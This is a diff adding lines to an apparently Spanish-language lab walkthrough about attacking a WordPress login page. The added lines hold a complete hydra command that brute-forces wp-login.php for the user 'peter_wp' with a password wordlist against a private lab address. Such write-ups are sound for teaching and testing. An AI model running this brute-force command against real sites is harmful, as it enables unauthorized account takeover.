@@ -100,3 +100,6 @@ Una vez identificado el usuario válido <strong>peter_wp</strong> y preparado el
 En WordPress, el inicio de sesión se realiza a través del archivo wp-login.php, por lo que el ataque se dirige contra dicho formulario.
 
 El comando utilizado es el siguiente:
+```bash
+hydra -l peter_wp -P /tmp/rockyou-reversed.txt 192.168.1.10 http-post-form \
+"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&redirect_to=http%3A%2F%2F192.168.1.10%2F:S=302"
